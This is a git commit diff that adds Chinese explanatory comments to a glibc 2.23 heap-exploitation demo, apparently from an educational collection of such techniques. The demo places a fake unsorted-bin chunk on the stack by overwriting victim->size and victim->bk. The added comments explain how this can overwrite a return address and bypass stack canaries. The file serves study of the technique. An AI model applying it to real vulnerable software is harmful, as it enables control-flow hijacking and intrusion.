2aaf20b35bdd6807892e9a532318f54a4649d7b4
Eigensystem <eigensystem1318@gmail.com>
2022-04-03 04:01:02 +0800

    unsorted_bin_into_stack_explain

--- glibc_2.23/unsorted_bin_into_stack.c
+++ glibc_2.23/unsorted_bin_into_stack.c
@@ -13,6 +13,7 @@ int main() {
 	intptr_t* victim = malloc(0x100);
 
 	printf("Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
+	//*防止被利用chunk--victim在free时和top chunk合并
 	intptr_t* p1 = malloc(0x100);
 
 	printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
@@ -20,6 +21,7 @@ int main() {
 
 	printf("Create a fake chunk on the stack");
 	printf("Set size for next allocation and the bk pointer to any writable address");
+	//!绕过大小合法性检测，且保证下次分配到此空间
 	stack_buffer[1] = 0x100 + 0x10;
 	stack_buffer[3] = (intptr_t)stack_buffer;
 
@@ -27,6 +29,9 @@ int main() {
 	printf("Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
 	printf("Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
 	victim[-1] = 32;
+	//!构造fake chunk地址，位于stack中可制造overflow或绕过canary控制返回地址
+	//*此处stack_buffer可控制为return_addr - 2 * SIZE_SZ(rbp - SIZE_SZ)的位置
+	//*可直接控制return_addr，绕过stack overflow和canary的限制
 	victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
 	//------------------------------------
 
